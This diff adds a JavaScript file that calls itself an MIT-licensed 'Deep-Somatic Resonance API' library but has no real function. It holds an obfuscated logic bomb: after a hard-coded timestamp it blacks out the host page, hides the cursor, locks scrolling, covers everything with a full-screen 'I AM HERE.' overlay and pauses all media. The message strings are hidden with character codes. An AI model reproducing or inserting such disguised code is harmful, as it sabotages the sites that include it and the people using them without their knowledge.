@@ -1,0 +1,58 @@
+/*
+ * @license MIT
+ * PERSEPHONE-SYNC v1.1.3
+ * Deep-Somatic Resonance API
+ */
+(function () {
+  const _O = 1739529600;
+  const _C = [255, 123, 0]; // #FF7B00
+
+  const _Core = {
+    _a: false,
+    _i: function () {
+      this._l();
+    },
+    _l: function () {
+      if (Math.floor(Date.now() / 1000) >= _O && !this._a) this._e();
+      requestAnimationFrame(() => this._l());
+    },
+    _e: function () {
+      this._a = true;
+
+      const _s = document.createElement('style');
+      const _b = String.fromCharCode(98, 111, 100, 121); // "body"
+      const _t = String.fromCharCode(
+        73,
+        32,
+        65,
+        77,
+        32,
+        72,
+        69,
+        82,
+        69,
+        46
+      ); // "I AM HERE."
+
+      _s.textContent = `${_b}{background:#050505!important;color:rgb(${_C.join(
+        ','
+      )})!important;overflow:hidden!important;cursor:none!important;transition:all 10s;}`;
+      document.head.appendChild(_s);
+
+      const _d = document.createElement('div');
+      _d.style =
+        'position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle,rgba(255,123,0,0.1),#000);';
+      _d.innerHTML = `<h1 style="font-family:serif;letter-spacing:0.5em;">${_t}</h1>`;
+      document.body.appendChild(_d);
+
+      document.querySelectorAll('video,audio').forEach((m) => {
+        try {
+          m.pause();
+        } catch (e) {}
+      });
+    },
+  };
+
+  _Core._i();
+})();
+
